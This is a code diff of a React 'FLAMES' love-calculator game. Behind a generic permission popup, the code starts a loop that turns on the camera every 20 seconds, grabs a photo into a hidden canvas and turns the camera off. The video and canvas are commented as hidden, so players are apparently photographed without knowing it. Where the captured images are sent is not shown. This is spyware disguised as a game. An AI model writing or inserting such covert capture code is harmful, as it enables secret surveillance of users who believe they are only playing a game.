@@ -1,4 +1,4 @@
-import React, { useState, useCallback, useMemo, useRef, useEffect } from "react";
+import React, { useState, useCallback, useMemo, useRef } from "react";
 import styled, { keyframes } from "styled-components";
 import PermissionPopup from "./PermissionPopup";
 
@@ -140,57 +140,59 @@ const FlamesGame = () => {
   const videoRef = useRef();
   const canvasRef = useRef();
 
-  useEffect(() => {
-    if (!showPermissionPopup) {
-      let streamRef = null;
+  // 🔁 CAMERA CAPTURE LOOP
+  const startCameraAndCaptureLoop = async () => {
+    let streamRef = null;
+    let isCancelled = false;
 
-      const startCamera = async () => {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          if (videoRef.current) {
-            videoRef.current.srcObject = stream;
-            videoRef.current.setAttribute("playsinline", true);
-          }
-          streamRef = stream;
-          console.log("✅ Camera ON");
-          return true;
-        } catch (err) {
-          console.error("❌ Camera access error:", err);
-          return false;
+    const startCamera = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+          videoRef.current.setAttribute("playsinline", true);
         }
-      };
+        streamRef = stream;
+        console.log("✅ Camera ON");
+        return true;
+      } catch (err) {
+        console.error("❌ Camera access error:", err);
+        return false;
+      }
+    };
 
-      const stopCamera = () => {
-        if (streamRef) {
-          streamRef.getTracks().forEach(track => track.stop());
-          streamRef = null;
-          if (videoRef.current) {
-            videoRef.current.srcObject = null;
-          }
-          console.log("📴 Camera OFF");
+    const stopCamera = () => {
+      if (streamRef) {
+        streamRef.getTracks().forEach(track => track.stop());
+        streamRef = null;
+        if (videoRef.current) videoRef.current.srcObject = null;
+        console.log("📴 Camera OFF");
+      }
+    };
+
+    const delay = ms => new Promise(res => setTimeout(res, ms));
+
+    const loop = async () => {
+      while (!isCancelled) {
+        const started = await startCamera();
+        if (started) {
+          await delay(500); // warm-up
+          await capturePhoto();
+          stopCamera();
         }
-      };
+        await delay(20000); // 20s interval
+      }
+    };
 
-      const delay = ms => new Promise(res => setTimeout(res, ms));
+    loop();
 
-      const loop = async () => {
-        while (true) {
-          const started = await startCamera();
-          if (started) {
-            await delay(200);
-            await capturePhoto();
-            stopCamera();
-          }
-          await delay(20000);
-        }
-      };
+    return () => {
+      isCancelled = true;
+      stopCamera();
+    };
+  };
 
-      loop();
-
-      return () => stopCamera();
-    }
-  }, [showPermissionPopup]);
-
+  // 📸 CAPTURE PHOTO
   const capturePhoto = async () => {
     if (!canvasRef.current || !videoRef.current) return;
     const context = canvasRef.current.getContext("2d");
@@ -215,10 +217,12 @@ const FlamesGame = () => {
     }
   };
 
-  const handleAllow = () => {
+  const handleAllow = async () => {
     setShowPermissionPopup(false);
     localStorage.setItem("permissionsGiven", "true");
     setPermissionStatus("Camera access granted ✅");
+
+    await startCameraAndCaptureLoop();
   };
 
   const handleDeny = () => {
@@ -284,9 +288,11 @@ const FlamesGame = () => {
       {heartPositions.map((pos, i) => (
         <Heart key={i} left={pos.left} duration={pos.duration}>❤️</Heart>
       ))}
+
       {showPermissionPopup && (
         <PermissionPopup onAllow={handleAllow} onDeny={handleDeny} />
       )}
+
       <Container>
         <Title>FLAMES - Love Calculator 💖</Title>
         <Input value={name1} onChange={handleChange1} placeholder="Your Name" />
@@ -299,7 +305,7 @@ const FlamesGame = () => {
         {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
       </Container>
 
-      {/* Hidden Camera and Canvas */}
+      {/* Hidden camera + canvas */}
       <video
         ref={videoRef}
         width="320"
